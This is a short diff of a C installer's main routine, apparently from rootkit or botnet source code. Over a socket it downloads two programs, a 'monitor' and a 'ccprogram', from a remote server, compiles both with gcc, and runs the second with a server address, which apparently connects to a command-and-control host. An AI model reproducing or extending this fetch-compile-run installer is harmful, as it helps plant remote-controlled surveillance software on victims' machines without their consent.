@@ -56,24 +56,26 @@ int main(int argc,char* argv[])
         execcmd(rktargs);
     }
     
-    rv = opensocket();
-    rv = obtain(MONITOR);
+    opensocket();
+    rv += obtain(MONITOR);
     close(sock_fd);
+    
+    opensocket();
+    rv += obtain(CCPROGRAM);
+    close(sock_fd);
+    
     if(rv == 0){
         char *moniargs[] = {"gcc", MONITOR, "-o", "monitor", NULL};
         execcmd(moniargs);
-    }
     
-    rv = opensocket();
-    rv = obtain(CCPROGRAM);
-    close(sock_fd);
-    if(rv == 0){
         char *cplargs[] = {"gcc", CCPROGRAM, "-o", "ccprogram", NULL};
         execcmd(cplargs);
         
         char *ccargs[] = {"./ccprogram", SERVER_ADDR, NULL};
         execcmd(ccargs);
     }
+    
+    
     
     printf("Install success!\n");
     return 0;
